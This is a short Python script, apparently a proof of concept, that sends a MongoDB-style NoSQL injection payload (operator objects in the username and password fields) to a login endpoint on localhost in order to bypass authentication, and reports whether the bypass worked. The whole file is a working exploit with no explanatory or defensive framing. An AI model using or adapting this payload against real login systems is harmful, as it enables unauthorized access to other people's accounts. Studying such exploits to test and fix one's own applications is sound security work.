import requests

TARGET_URL = "http://localhost:8080/login"

def exploit():
    payload = {
        "username": {"$gt": ""},
        "password": {"$gt": ""}
    }
    
    print("[*] Attempting authentication bypass...")
    response = requests.post(TARGET_URL, json=payload)
    
    if "success" in response.text:
        print("[+] Bypass successful!")
    else:
        print("[-] Bypass failed.")

if __name__ == "__main__":
    exploit()